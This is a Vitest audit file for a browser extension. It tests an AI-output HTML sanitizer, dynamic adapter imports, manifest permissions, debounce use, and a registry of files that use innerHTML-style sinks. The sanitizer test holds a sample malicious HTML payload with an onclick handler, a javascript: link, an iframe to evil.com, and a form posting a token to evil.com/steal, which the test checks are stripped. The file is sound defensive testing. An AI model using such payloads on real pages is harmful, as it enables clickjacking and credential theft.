
import { JSDOM } from "jsdom";
import { describe, it, expect, vi, afterEach } from "vitest";
import { sanitizeAiHtml } from "../src/shared/sanitizer.js";
import fs from 'fs';
import path from 'path';

const HTML_SINKS = ["innerHTML", "outerHTML", "insertAdjacentHTML"];
const CLASSIFIED_HTML_SINK_FILES = new Map([
  ["src/content/adapters/chatwork.js", "static adapter button icon markup"],
  ["src/content/adapters/gmail.js", "static adapter button icon markup"],
  ["src/content/adapters/jira.js", "static adapter button icon markup"],
  ["src/content/content.js", "summary restore shell with escaped page title and sanitized AI bubble renderer"],
  ["src/content/youtubeTranscript.js", "read-only transcript parser source extraction"],
  ["src/content/ui/Bilingual.js", "dynamic translation text escaped before insertion"],
  ["src/content/ui/ColorPicker.js", "static shell plus escaped color history renderer"],
  ["src/content/ui/CommandPalette.js", "static shell plus escaped filtered command/note text"],
  ["src/content/ui/FloatingTrigger.js", "static trigger/menu markup"],
  ["src/content/ui/FullPageCapture.js", "static loading shell markup"],
  ["src/content/ui/FuriganaHover.js", "static tooltip shell plus escaped kana/romaji/meaning renderer"],
  ["src/content/ui/GlossaryHighlighter.js", "restores previously sanitized glossary card HTML"],
  ["src/content/ui/InlineWriter.js", "static shell/status markup plus escaped AI output renderer"],
  ["src/content/ui/KeigoChecker.js", "static shell/status markup plus escaped rewrite/suggestion text"],
  ["src/content/ui/MeetingRecorder.js", "static recorder shell markup"],
  ["src/content/ui/OCR.js", "static shell plus OCR text rendered in controlled textarea/tab views"],
  ["src/content/ui/QuickBox.js", "static shell plus sanitized AI markdown output"],
  ["src/content/ui/QuickInjector.js", "static shell plus escaped quick action item renderer"],
  ["src/content/ui/QuickNote.js", "static memo shell plus textarea-backed note content"],
  ["src/content/ui/ShadowReply.js", "static shell plus escaped title/context values"],
  ["src/content/ui/Toolbar.js", "static toolbar icon markup"],
  ["src/content/ui/quickbox/chatComposer.js", "static chat bubble shell with escaped prompt/image metadata"],
  ["src/content/ui/quickbox/dictionaryError.js", "static dictionary loading/error markup"],
  ["src/content/ui/quickbox/dictionaryRenderer.js", "escaped dictionary card renderer"],
  ["src/content/ui/quickbox/glossaryCard.js", "escaped glossary card renderer"],
  ["src/content/ui/quickbox/glossaryOverlay.js", "static glossary overlay shell"],
  ["src/content/ui/quickbox/headerActions.js", "static chat history reset markup"],
  ["src/content/ui/quickbox/ipa.js", "escaped IPA helper renderer"],
  ["src/content/ui/quickbox/orchestrator.js", "static loading/chat shell plus escaped selection text"],
  ["src/content/ui/quickbox/responseActions.js", "sanitized AI response actions renderer"],
  ["src/options/options.js", "escaped learned-term renderer and settings status textContent"],
  ["src/popup/popup.js", "escaped Todo/learned-term renderers and settings status textContent"],
  ["src/shared/modelConfig.js", "curated static model option renderer"],
  ["src/sidepanel/chatController.js", "escaped stream error/status rendering"],
  ["src/sidepanel/chatFormatting.js", "sanitized sidepanel markdown renderer"],
  ["src/sidepanel/crossTabContext.js", "static cross-tab empty state markup"],
  ["src/sidepanel/jiraContext.js", "escaped Jira/backend context card renderer"],
  ["src/sidepanel/projectStatus.js", "escaped project status renderer"],
  ["src/sidepanel/sidepanel.js", "static local-version badge markup"],
  ["src/sidepanel/writeComposer.js", "escaped stream error rendering; AI output via innerText"],
]);

const DYNAMIC_HTML_SINK_HELPERS = new Map([
  ["src/content/content.js", ["escapeHtml", "updateAiContent"]],
  ["src/content/ui/Bilingual.js", ["escapeHtml"]],
  ["src/content/ui/CommandPalette.js", ["escapeHtml"]],
  ["src/content/ui/FuriganaHover.js", ["escapeHtml"]],
  ["src/content/ui/InlineWriter.js", ["innerText"]],
  ["src/content/ui/KeigoChecker.js", ["escapeHtml"]],
  ["src/content/ui/QuickBox.js", ["sanitizeAiHtml"]],
  ["src/content/ui/QuickInjector.js", ["buildQuickInjectorItemHtml"]],
  ["src/content/ui/ShadowReply.js", ["textContent"]],
  ["src/content/ui/quickbox/chatComposer.js", ["escapeHtml"]],
  ["src/content/ui/quickbox/dictionaryRenderer.js", ["escapeHtml"]],
  ["src/content/ui/quickbox/glossaryCard.js", ["escapeHtml"]],
  ["src/content/ui/quickbox/ipa.js", ["escapeHtml"]],
  ["src/content/ui/quickbox/orchestrator.js", ["actionTitles"]],
  ["src/content/ui/quickbox/responseActions.js", ["sanitizeAiHtml", "escapeHtml"]],
  ["src/options/options.js", ["buildLearnedTermsHtml"]],
  ["src/popup/popup.js", ["escapeHtml", "buildLearnedTermsHtml"]],
  ["src/sidepanel/chatController.js", ["escapeHtml"]],
  ["src/sidepanel/chatFormatting.js", ["sanitizeAiHtml"]],
  ["src/sidepanel/jiraContext.js", ["escapeHtml"]],
  ["src/sidepanel/projectStatus.js", ["escapeHtml", "escapeAttribute"]],
  ["src/sidepanel/writeComposer.js", ["escapeHtml"]],
]);

function listJsFiles(dir) {
  return fs.readdirSync(dir, { withFileTypes: true }).flatMap((entry) => {
    const fullPath = path.join(dir, entry.name);
    if (entry.isDirectory()) return listJsFiles(fullPath);
    return entry.isFile() && entry.name.endsWith(".js") ? [fullPath] : [];
  });
}

describe("Comprehensive Extension Audit", () => {
  
  describe("Security: Sanitizer strictness", () => {
    afterEach(() => {
      delete global.document;
    });

    it("should strip out all interactive elements like buttons and links to prevent Clickjacking", () => {
      const dom = new JSDOM("<!doctype html><body></body>");
      global.document = dom.window.document;

      const maliciousHtml = `
        <div>
          <p>Safe text</p>
          <button onclick="maliciousAction()">Click me for prize</button>
          <a href="javascript:alert('XSS')">Claim prize</a>
          <iframe src="https://evil.com"></iframe>
          <form action="https://evil.com/steal"><input name="token"></form>
        </div>
      `;

      const sanitized = sanitizeAiHtml(maliciousHtml);

      expect(sanitized).toContain("<p>Safe text</p>");
      expect(sanitized).not.toContain("<button");
      expect(sanitized).not.toContain("<a ");
      expect(sanitized).not.toContain("<iframe");
      expect(sanitized).not.toContain("<form");
      expect(sanitized).not.toContain("<input");
      expect(sanitized).not.toContain("onclick");
      expect(sanitized).not.toContain("javascript:");
    });

    it("should allow safe formatting tags", () => {
      const dom = new JSDOM("<!doctype html><body></body>");
      global.document = dom.window.document;

      const safeHtml = "<div><h1>Title</h1><p>Text with <strong>bold</strong> and <em>italics</em></p><ul><li>Item</li></ul></div>";
      const sanitized = sanitizeAiHtml(safeHtml);

      expect(sanitized).toBe(safeHtml);
    });
  });

  describe("Architecture: Content Script Optimization", () => {
    it("should use dynamic imports for site-specific adapters to keep initial load light", () => {
      const contentJsPath = path.resolve(__dirname, '../src/content/content.js');
      const contentJs = fs.readFileSync(contentJsPath, 'utf8');
      
      // Check for dynamic import patterns
      expect(contentJs).toContain("import('./adapters/jira.js')");
      expect(contentJs).toContain("import('./adapters/gmail.js')");
      expect(contentJs).toContain("import('./adapters/chatwork.js')");
    });

    it("should inject on normal http/https pages without redundant optional host permissions", () => {
      const manifestPath = path.resolve(__dirname, '../manifest.json');
      const manifest = JSON.parse(fs.readFileSync(manifestPath, 'utf8'));
      
      const hostPermissions = manifest.host_permissions || [];
      expect(hostPermissions).toContain("<all_urls>");
      expect(manifest.optional_host_permissions || []).toHaveLength(0);

      const matches = manifest.content_scripts?.flatMap((script) => script.matches || []) || [];
      expect(matches).toContain("http://*/*");
      expect(matches).toContain("https://*/*");
    });
  });

  describe("Performance: DOM Observation Throttling", () => {
    it("should use debounce in all major site adapters", () => {
      const adaptersDir = path.resolve(__dirname, '../src/content/adapters');
      const files = fs.readdirSync(adaptersDir);
      
      for (const file of files) {
        if (file.endsWith('.js')) {
          const content = fs.readFileSync(path.join(adaptersDir, file), 'utf8');
          expect(content).toContain("import { debounce } from '../utils/debounce.js'");
          expect(content).toContain("debounce(");
        }
      }
    });
  });

  describe("Security: HTML sink classification", () => {
    it("keeps every HTML sink file explicitly classified", () => {
      const srcDir = path.resolve(__dirname, "../src");
      const htmlSinkFiles = listJsFiles(srcDir)
        .filter((file) => HTML_SINKS.some((sink) => fs.readFileSync(file, "utf8").includes(sink)))
        .map((file) => path.relative(srcDir, file).replaceAll(path.sep, "/"))
        .map((file) => `src/${file}`)
        .sort();

      expect(htmlSinkFiles).toEqual([...CLASSIFIED_HTML_SINK_FILES.keys()].sort());
    });

    it("requires dynamic HTML sink files to keep sanitizer or renderer helpers in use", () => {
      const repoRoot = path.resolve(__dirname, "..");
      for (const [relativePath, requiredHelpers] of DYNAMIC_HTML_SINK_HELPERS.entries()) {
        const content = fs.readFileSync(path.join(repoRoot, relativePath), "utf8");
        for (const helper of requiredHelpers) {
          expect(content, `${relativePath} should keep ${helper}`).toContain(helper);
        }
      }
    });
  });
});
